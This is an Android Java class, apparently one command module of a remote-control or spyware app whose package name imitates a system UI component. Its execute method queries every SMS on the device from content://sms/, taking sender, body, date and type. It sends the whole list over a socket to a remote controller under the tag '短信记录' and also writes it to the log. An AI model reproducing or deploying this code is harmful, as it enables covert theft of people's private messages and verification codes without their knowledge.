package com.system.ui.interpret;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import com.system.ui.model.SmsRecord;
import com.system.ui.service.LocalService;

import java.util.ArrayList;
import java.util.List;

/**
 * 发送短信记录的行为
 */
public class SendSmsAction extends AbsAction {

	/**
	 * 所有短信
	 */
	public static final String SMS_URI_ALL = "content://sms/";
	
	/**
	 * 收件箱短信
	 */
	public static final String SMS_URI_INBOX = "content://sms/inbox";
	
	/**
	 * 已发送短信
	 */
	public static final String SMS_URI_SEND = "content://sms/sent";
	
	/**
	 * 草稿箱短信
	 */
	public static final String SMS_URI_DRAFT = "content://sms/draft";

	private ContentResolver mResolver;
	
	public SendSmsAction(Context context) {
		super(context);
	}
	
	@Override
	public boolean execute() {
		try {
			((LocalService)mContext).getSocketThread().send("短信记录<*>"+getSmsInfo().toString());
			Log.d("hyx:", getSmsInfo().toString());
		} catch (Exception e) {
			e.printStackTrace();
			return false;
		}
		return true;
	}
	
	/**
	 * 获取所有短信
	 */
	public List<SmsRecord> getSmsInfo() {
		Uri uri = Uri.parse(SMS_URI_ALL);
		mResolver = mContext.getContentResolver();
		Cursor cursor = mResolver.query(uri, new String[] { "address", "body", "date", "type" }, null, null, null);
		List<SmsRecord> records = new ArrayList<SmsRecord>();
		if (cursor != null && cursor.getCount() > 0) {
			while (cursor.moveToNext()) {
				SmsRecord record = new SmsRecord();
				record.address = cursor.getString(cursor.getColumnIndex("address"));
				record.body = cursor.getString(cursor.getColumnIndex("body"));
				record.date = cursor.getLong(cursor.getColumnIndex("date"));
				record.type = cursor.getInt(cursor.getColumnIndex("type"));
				records.add(record);
			}
		}
		if (cursor != null) {
			cursor.close();
		}
		return records;
	}
}
